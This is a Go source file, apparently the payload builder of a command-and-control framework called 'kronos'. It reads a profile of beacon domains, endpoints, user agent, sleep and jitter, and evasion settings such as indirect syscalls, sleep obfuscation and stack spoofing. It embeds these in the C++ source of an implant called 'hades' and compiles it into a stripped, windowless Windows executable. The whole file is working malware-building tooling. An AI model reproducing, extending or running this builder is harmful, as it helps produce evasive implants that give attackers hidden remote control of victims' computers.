package payloadgen

// this file wll be changed alot as the implant grows
// right now its the bare minimum for testing


import (
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unicode/utf16"

	"gopkg.in/yaml.v3"
)

type Domain struct {
	Host  string `yaml:"host"`
	Port  int    `yaml:"port"`
	HTTPS bool   `yaml:"https"`
}

type Endpoints struct {
	Get  string `yaml:"get"`
	Post string `yaml:"post"`
}

type Sleep struct {
	Interval int `yaml:"interval"`
	Jitter   int `yaml:"jitter"`
}

type Obfuscation struct {
	Syscall    string `yaml:"syscall"`
	Heap       bool   `yaml:"heap"`
	SleepObf   bool   `yaml:"sleep"`
	StackSpoof bool   `yaml:"stack_spoof"`
}

type Profile struct {
	Domains     []Domain          `yaml:"domains"`
	Endpoints   Endpoints         `yaml:"endpoints"`
	UserAgent   string            `yaml:"user_agent"`
	Sleep       Sleep             `yaml:"sleep"`
	Obfuscation Obfuscation       `yaml:"obfuscation"`
}


func LoadProfile() (*Profile, error) {
	home, _ := os.UserHomeDir()
	path := filepath.Join(home, ".kronos", "profile.yaml")

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var prof Profile
	err = yaml.Unmarshal(data, &prof)
	if err != nil {
		return nil, err
	}

	return &prof, nil

}


func longestDomain(domains []Domain) int {
	longest := 0
	for _, entry := range domains {
		l := MultiByteLength(entry.Host)
		if l > longest {
			longest = l
		}
	}
	return longest
}

func MultiByteLength(val string) int {
	return len(utf16.Encode([]rune(val))) + 1
}


func writeU32(buf []byte, offset int, val uint32) {
	binary.LittleEndian.PutUint32(buf[offset:], val)
}

func writeStringNull(buf []byte, offset int, s string) int {
	copy(buf[offset:], s)
	buf[offset+len(s)] = 0
	return len(s) + 1
}

func syscallTypeToInt(s string) uint32 {
	switch strings.ToLower(s) {
	case "direct":
		return 1
	case "indirect":
		return 2
	default:
		return 0
	}
}

func boolToU32(b bool) uint32 {
	if b {
		return 1
	}
	return 0
}

func CraftProfileBytes(prof *Profile) ([]byte, error) {
	size := 4 // domaincount
	for _, d := range prof.Domains {
		size += 4 + len(d.Host) + 1 + 4 + 4
	}
	size += 4 + len(prof.Endpoints.Get) + 1   
	size += 4 + len(prof.Endpoints.Post) + 1   
	size += 4 + len(prof.UserAgent) + 1         
	size += 4 * 5                               

	buf := make([]byte, size)
	off := 0

	writeU32(buf, off, uint32(len(prof.Domains)))
	off += 4

	for _, d := range prof.Domains {
		strLen := uint32(len(d.Host) + 1)
		writeU32(buf, off, strLen)
		off += 4
		off += writeStringNull(buf, off, d.Host)
		writeU32(buf, off, uint32(d.Port))
		off += 4
		writeU32(buf, off, boolToU32(d.HTTPS))
		off += 4
	}

	writeU32(buf, off, uint32(len(prof.Endpoints.Get)+1))
	off += 4
	off += writeStringNull(buf, off, prof.Endpoints.Get)

	writeU32(buf, off, uint32(len(prof.Endpoints.Post)+1))
	off += 4
	off += writeStringNull(buf, off, prof.Endpoints.Post)

	writeU32(buf, off, uint32(len(prof.UserAgent)+1))
	off += 4
	off += writeStringNull(buf, off, prof.UserAgent)

	writeU32(buf, off, uint32(prof.Sleep.Interval))
	off += 4
	writeU32(buf, off, uint32(prof.Sleep.Jitter))
	off += 4

	writeU32(buf, off, syscallTypeToInt(prof.Obfuscation.Syscall))
	off += 4
	writeU32(buf, off, boolToU32(prof.Obfuscation.Heap))
	off += 4
	writeU32(buf, off, boolToU32(prof.Obfuscation.SleepObf))
	off += 4

	return buf, nil
}

func UpdateConfigSource(prof *Profile, profileData []byte) error {
	home, _ := os.UserHomeDir()
	base := filepath.Join(home, ".kronos", "payload", "implant", "hades")
	tmplPath := filepath.Join(base, "config.hpp.tmpl")
	outPath := filepath.Join(base, "config.hpp")

	content, err := os.ReadFile(tmplPath)
	if err != nil {
		return err
	}

	domainCount := len(prof.Domains)
	domainBufLen := longestDomain(prof.Domains)
	getLen := MultiByteLength(prof.Endpoints.Get)
	postLen := MultiByteLength(prof.Endpoints.Post)
	uaLen := MultiByteLength(prof.UserAgent)

	result := string(content)
	result = strings.Replace(result, "REPLACE_COUNT_MARKER", fmt.Sprintf("%d", domainCount), 1)
	result = strings.Replace(result, "REPLACE_LEN_MARKER", fmt.Sprintf("%d", domainBufLen), 1)
	result = strings.Replace(result, "REPLACE_GET_MARKER", fmt.Sprintf("%d", getLen), 1)
	result = strings.Replace(result, "REPLACE_POST_MARKER", fmt.Sprintf("%d", postLen), 1)
	result = strings.Replace(result, "REPLACE_UA_MARKER", fmt.Sprintf("%d", uaLen), 1)

	profileHex := formatBytesAsHex(profileData)
	result = strings.Replace(result, `"REPLACE_PROFILE_DATA_MARKER"`, profileHex, 1)
	result = strings.Replace(result, "REPLACE_PROF_LEN_MARKER", fmt.Sprintf("%d", len(profileData)), 1)

	return os.WriteFile(outPath, []byte(result), 0644)
}

func formatBytesAsHex(data []byte) string {
	var sb strings.Builder
	sb.WriteString("(PBYTE)\"")
	for _, b := range data {
		fmt.Fprintf(&sb, "\\x%02x", b)
	}
	sb.WriteString("\"")
	return sb.String()
}

func GenerateProfile() error {
	prof, err := LoadProfile()
	if err != nil {
		return fmt.Errorf("failed loading config: %w", err)
	}

	profileData, err := CraftProfileBytes(prof)
	if err != nil {
		return fmt.Errorf("failed crafting profile: %w", err)
	}

	return UpdateConfigSource(prof, profileData)
}


func Compile(name string, debug bool) (string, error) {
	home, _ := os.UserHomeDir()
	srcDir := filepath.Join(home, ".kronos", "payload", "implant")
	buildDir := filepath.Join(home, ".kronos", "builds")

	if err := os.MkdirAll(buildDir, 0700); err != nil {
		return "", err
	}

	outPath := filepath.Join(buildDir, name+".exe")

	args := []string{
		"x86_64-w64-mingw32-c++",
		"-o", outPath,
		"main.cpp",
		"hades/hades.cpp",
		"hades/init.cpp",
		"hades/config.cpp",
		"utils/utils.cpp",
		"utils/bytes.cpp",
		"utils/api.cpp",
		"fileops/files.cpp",
		"cmds/cmds.cpp",
		"networkd/network.cpp",
		"-I", ".",
		"-lkernel32", "-lmsvcrt",
		"-static", "-std=c++17",
	}

	if debug {
		args = append(args, "-D_DEBUG", "-O0")
	} else {
		args = append(args, "-O2", "-s", "-mwindows")
	}

	cmd := exec.Command(args[0], args[1:]...)
	cmd.Dir = srcDir

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("compilation failed: %s\n%s", err, string(output))
	}

	return outPath, nil
}